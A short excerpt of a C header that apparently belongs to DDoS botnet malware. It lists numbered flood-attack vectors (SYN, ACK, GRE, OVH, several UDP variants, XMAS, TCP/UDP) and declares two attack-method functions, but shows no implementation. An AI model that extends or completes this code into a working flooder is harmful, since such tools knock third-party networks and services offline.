...
#define MAXFD_SEND 100

#define ATK_VEC_SYN        0
#define ATK_VEC_ACK        1
#define ATK_VEC_GREIP      2
#define ATK_VEC_STD        3
#define ATK_VEC_OVH        4
#define ATK_VEC_UDPPLAIN   5
#define ATK_VEC_RAW        6
#define ATK_VEC_PSH        7
#define ATK_VEC_UDPHEX     8    
#define ATK_VEC_UDPRAND    9
#define ATK_VEC_UDPSTR     10
#define ATK_VEC_UDPPUSH    11
#define ATK_VEC_XMAS       12
#define ATK_VEC_TCPUDP     13
...
void attack_method_tcpudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
void attack_method_psh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
